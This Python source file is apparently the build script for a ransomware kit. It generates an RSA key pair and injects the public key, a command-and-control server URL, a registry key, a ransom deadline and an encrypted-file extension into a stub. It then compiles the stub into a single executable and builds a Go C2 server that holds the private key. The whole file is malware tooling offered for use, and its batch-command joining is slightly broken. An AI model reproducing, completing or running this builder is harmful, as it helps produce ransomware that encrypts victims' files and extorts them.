# Python program to easily build a new stub and c2
from typing_extensions import assert_never
from typing import Literal, Dict, Any
from stub.crypt.rsa import RSA
from pathlib import Path
import logging
import random
import string
import json
import os

_RSA_PUBLIC_KEY = "RSA_PUBLIC_KEY"
_REGISTRY_KEY = "REGISTRY_KEY"
_BASE_URL = "BASE_URL"
_RANSOM_DEADLINE = "RANSOM_DEADLINE"

with open("./config.json", "r") as f:
    Config = json.load(f)


def get_random_numbers(length: int) -> str:
    return "".join(random.choices(string.digits, k=length))


def replace_string(
    content: str, name: str, data: str, *, triple_quote: bool = False
) -> str:
    quotes = '"' if not triple_quote else '"""'
    identifier = f"{name}: str = {quotes}"

    if identifier not in content:
        return content

    old_data = content.split(identifier)[1].split(quotes)[0]

    new_content = content.replace(old_data, data)
    return new_content


def replace_encryption_config(content: str, extension: str) -> str:
    if not extension.startswith("."):
        extension = f".{extension}"

    identifier = 'ENCRYPTION_CONFIG: EncryptionConfig = EncryptionConfig("'
    old_data = content.split(identifier)[1].split('"')[0]
    if content.find(identifier) == -1:
        return content

    new_content = content.replace(old_data, extension)
    return new_content


def build_python(
    rsa_public_key: str,
    *,
    ransom_deadline: int = 72,
    c2_host: str = "http://localhost:9090",
    registry_key: str = get_random_numbers(10),
    encryption_extension: str = ".zzz",
    compiler: Literal["pyinstaller", "nuitka"] = "pyinstaller",
) -> None:

    # Find stub/types/const.py
    const_path = Path(__file__).parent
    while not (const_path / "stub" / "types" / "const.py").exists():
        const_path = const_path.parent
    const_path = const_path / "stub" / "types" / "const.py"

    with open(const_path, "r") as f:
        content = f.read()

    content = replace_string(content, _RSA_PUBLIC_KEY, rsa_public_key)
    content = replace_string(content, _REGISTRY_KEY, registry_key)
    content = replace_string(content, _BASE_URL, c2_host)
    content = replace_string(content, _RANSOM_DEADLINE, str(ransom_deadline))
    content = replace_encryption_config(content, encryption_extension)

    with open(const_path, "w") as f:
        f.write(content)

    if compiler == "pyinstaller":
        cmp_cmd = 'pyinstaller --clean --onefile --icon="" --add-data "stub/crypt;stub/crypt" --add-data "stub/file;stub/file" --add-data "stub/persistance;stub/persistance" --add-data "stub/ransom;stub/ransom" --add-data "stub/types;stub/types" --add-data "stub/utils;stub/utils" main.py'
    elif compiler == "nuitka":
        cmp_cmd = "nuitka --mingw64 --standalone --onefile --include-plugin-dir=stub/crypt --include-plugin-dir=stub/file --include-plugin-dir=stub/persistance --include-plugin-dir=stub/ransom --include-plugin-dir=stub/types --include-plugin-dir=stub/utils main.py"
    else:
        assert_never(compiler)

    cmds = "@echo off" "cls" "del main.spec" "del dist" "del build" f"{cmp_cmd}"
    cmd = "\n".join(cmds)

    with open("build.bat", "w") as f:
        f.write(cmd)

    os.system("build.bat")


def build_golang(
    rsa_private_key: str,
) -> None:
    with open("./private.pem", "w") as f:
        f.write(rsa_private_key)

    cmds = "@echo off" "cls" "del server.exe" "go build -o ./server.exe cmd/api/main.go"
    cmd = "\n".join(cmds)

    with open("c2_build.bat", "w") as f:
        f.write(cmd)

    os.system("c2_build.bat")


def main() -> None:
    new_key = RSA.generate_key_pair(4096)
    new_pub_key = new_key.publickey()

    key = RSA(pub_key=new_pub_key, priv_key=new_key)
    keypair = key.export_keys()
    priv_key_pem = keypair[0]
    pub_key_pem = keypair[1]

    if priv_key_pem is None or pub_key_pem is None:
        return logging.fatal("Failed to generate keys")

    ransom_deadline = int(Config["c2"]["ransom_deadline_hours"])
    c2_host = str(Config["ransom"]["c2_host"])
    registry_key = str(Config["ransom"]["registry_key"])
    encryption_extension = str(Config["ransom"]["encryption_extension"])
    compiler = str(Config["ransom"]["compiler"])

    kwargs: Dict[str, Any] = {
        "ransom_deadline": ransom_deadline,
        "c2_host": c2_host,
        "registry_key": registry_key,
        "encryption_extension": encryption_extension,
        "compiler": compiler,
    }
    for i in list(kwargs):
        if not kwargs[i]:
            del kwargs[i]

    build_python(pub_key_pem, **kwargs)
    build_golang(priv_key_pem)


if __name__ == "__main__":
    main()
